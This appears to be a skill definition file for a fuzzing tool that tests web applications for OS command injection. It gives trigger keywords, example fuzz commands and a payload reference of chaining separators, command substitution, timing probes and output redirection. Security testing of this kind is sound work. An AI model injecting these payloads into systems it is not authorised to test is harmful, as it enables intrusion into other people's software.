---
name: command_injection_testing
description: "OS command injection vulnerability detection and exploitation"
triggers:
  - command injection
  - rce
  - remote code execution
  - os command
  - shell injection
  - pipe
  - semicolon
  - backtick
  - dollar
  - whoami
  - ls
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

Command injection testing discovers vulnerabilities where user input is passed to system shell commands without proper sanitization, potentially allowing arbitrary command execution.

## Capabilities

- Command injection detection
- Argument injection
- Chaining multiple commands
- Output redirection testing
- Pipe-based attacks
- Subshell execution
- Environment variable manipulation
- Command substitution testing

## Usage

### Basic Command Injection Test

```bash
slapper fuzz --target https://example.com/ping?host=127.0.0.1 --type command-injection
```

### With Specific Payloads

```bash
slapper fuzz --target https://example.com/shell?cmd=ls --type command-injection
```

## Payloads Reference

**Command Chaining:**
```bash
; ls
| ls
&& ls
|| ls
`ls`
$(ls)
```

**Environment Variables:**
```bash
$PATH
${HOME}
${USER}
$(whoami)
```

**Blind Injection (Timing):**
```bash
; sleep 5
&& sleep 5
|| sleep 5
```

**Output Redirection:**
```bash
> /tmp/output
>> /tmp/output
2>&1
```

## Triggers

Keywords: command injection, rce, remote code execution, shell, execute, pipe, semicolon, backtick, dollar, os command, system, whoami, id, uname, cat, ls, ps

## Best Practices

1. Use timing-based detection for blind command injection
2. Test multiple command separators (;, &&, ||, |)
3. Try both single and double quotes for bypass
4. Check for command substitution with backticks or $()
5. Test for output redirection and file writing